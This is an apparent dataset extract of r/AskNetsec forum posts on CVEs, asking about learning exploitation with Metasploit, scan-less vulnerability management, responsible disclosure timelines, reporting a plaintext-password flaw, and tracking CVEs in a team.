0,CVEs,AskNetsec,How to run code from exploits?,1,embhys,https://www.reddit.com/r/AskNetsec/comments/embhys/how_to_run_code_from_exploits/,2020-01-10 02:54:08,"Hi all. Starting my journey to understand exploitation techniques and tooling around this. First things first: learning how to use metasploit/meterpreter, as well some CVEs. To move on my objective is to run some exploit codes I've found googling in order to get the feeling of how things work. To do that I got a random application (in this case Foxit PDF Reader since I have it installed in my home computer), then searched for exploits available in metasploit and then googled about some exploitation articles (with code) related. My very first one was to follow this article which contains how the exploit was reached and the code involved, although I did not succeeded. My intention was to copy and paste the code, save the file as a PDF and see ""something going wrong"". Since that failed, my question is how do you do to test this kind of code? If you have other suggestions, please share in this post (I know it is tough to learn it although I will not give up). Thanks in advance."

I know what software engineering is but I don't know what the other two are and how they all differ. I've looked at job descriptions but they are all very different. My understanding: Software engineer - develops a software product according to the needs of a business or maintains a current software product. Application security engineer - like software engineer but builds more secure software? idk. Pen tester - tries to break software that has been built by seeing if it is vulnerable to certain CWEs. does not try to discover cves. Can a software engineer transition to a pen tester/appsec engineer role? What does the software engineer need (e.g. CISSP/OSCP)? Is that the general picture?

28,CVEs,AskNetsec,Scan-less Vulnerability Management Process (and tool),6,74npia,https://www.reddit.com/r/AskNetsec/comments/74npia/scanless_vulnerability_management_process_and_tool/,2017-10-07 00:47:19,"TL;DR : see last paragraph. Hi everyone. I work in a small but growing cybersecurity team in a big company. This company is composed of multiple teams building and delivering various systems. Now, these teams would like us to monitor and warn them about vulnerabilities in the OS, tools and libraries they use and integrate. My first constraint is the disconnected nature of these systems. As we don't want the built systems to be impacted by anything, they are not connected neither to our IT network nor the Internet. The OS and softwares installations are prepared on the IT network and systems and transferred via USB keys. Second constraint is that there is no way I can run an agent on their systems nor can I perform scan on their networks (because both ""could be potentially disruptive""). They only want to provide me the list of softwares and versions they use so that we can monitor vulnerable versions. As we are a small and young team in the company, we don't have any power on these projects. I read some docs about Vulnerability Management Processes but all of them include scans, which I cannot perform. I realize scanning is only a small part of the Management Process but I could not find any tool to manage scan-less inventories. Do you know any resource or guide that would help me ? More important, do you know any tool where I could input lists of softwares and versions and then would regularly compare the software list to the list of CVEs, Ovals, whatever to notify me of potentially newly vulnerable versions ?"
29,CVEs,AskNetsec,Learning from mistakes. How long should you wait for a vendor to fix security issues and what should we have done when they refused to fix it for so long?,1,670fd1,https://www.reddit.com/r/AskNetsec/comments/670fd1/learning_from_mistakes_how_long_should_you_wait/,2017-04-23 14:23:36,"We recently released information to reddit about some hidden users and potential security holes in firmware. We found these issues and sent messages to the company about it. They mostly made tickets and said they would fix the issues but never did. We felt it was necessary to reveal this information to other clients since they had a right to know. We waited one or two years for them to release a patch and nothing ever changed. We wanted to give them time but we didn't want engineers to be left in the dark about these potential problems. Some clients thanked us and some people criticised us for doing it this way. They asked if we had CVE ids, but none of us have ever had to file any (so the answer was no). They asked if we told the vendor and how long we knew about the problems. There are a few more things of interest that we know of where attackers could get credentials and stuff in the right situation. (Told vendor about this a year ago) This time we would like to announce this properly so people know outside of reddit. It was hard getting the right info about CVEs and suggestions for when to report. We thought waiting half of a year or maybe a year before releasing this was acceptable but we wanted to ask here. 1. If you tell the vendor about the problem, how long should you wait before revealing this to public? We understand waiting for a patch and for the patch to be rolled out by other clients to their equipment so that everyone has a chance to protect themselves 2. When do you file for CVE? Do we wait until a patch or can we file immediately? 3. If we file a CVE, will they contact the vendor for us? 4. IS there a way to submit information needed for decrypting stuff (like keys) so they can verify without it being included in the final report or will they do that after reviewing? 5. What if the vulnerability exists only in older code or versions, do we still need to contact the vendor? We understand that we didn't go the best way in reporting this so we would like to know a more proper way in doing this for next time."

I'm meaning products in the family of Nessus, Nexpose, Qualys, IP360, and OpenVAS (i.e. scanning for CVEs rather than app scanners designed to find unknown flaws)"
31,CVEs,AskNetsec,"Found vulnerability in a program, now what?",1,5rjtg2,https://www.reddit.com/r/AskNetsec/comments/5rjtg2/found_vulnerability_in_a_program_now_what/,2017-02-02 12:28:56,"I decided to run a dumpit (a program that dumps the content of RAM to a file) on one of our software programs we use where I work. I found that it stores the password to the administration account in plaintext (I'm trying to remain vauge as to what program this is, for obvious reasons). I've never done a bug bounty or disclosed a vulnerability to a company before. I guess some of the questions I have are: 1. Is this a vulnerability worth reporting? I've googled and haven't found anyone that's publicly disclosed this vulnerability. I feel that it might be so simple it's not worthwhile to disclose, or even considered a vulnerability. 2. Should I worried about the company coming after me with lawyers by disclosing this vulnerability to them (I don't want to get sued). 3. I know a minimal amount about CVEs, is there a process for getting one for something like this? Or would this vulnerability not meet requirements for one? I'd appreciate if anyone could educate me on how CVEs work and how their assigned. Thanks in advance for any advice. Edit: I work for a small business and we're not a security company (we don't make money looking for and reporting vulnerabilities)."

I'm looking for a proper way of handling CVE management in my team. We all have our way of dealing with them except we all feel like missing some or sometimes starting process multiple times for the same CVE. That's really not acceptable, and I'd like to improve this. My basic need would be to get a basic CVE feed, select CVEs concerning my infrastructure and organizing them by severity. I'd be awsome to be able to have a ticketing integration too. What could my options be ? Thanks in advance for your help"

We're using a ~1 year old version and it appears some (or maybe all) of the issues may have been patched in the last 3-6 months, but there haven't been any disclosures, CVEs, etc. The change log says something like ""encoded output,"" or ""added CSRF token"" but doesn't refer to the fact there were multiple existing XSS, CSRF, etc issues in previous versions (and possibly still exist). I haven't reported a CVE or disclosed a vulnerability before, so I don't know the etiquette surrounding it. Should I submit/disclose the vulnerabilities (after doing a bit more research, e.g. versions affected), or is that pretty lame if a product has already been (quietly) patched?"
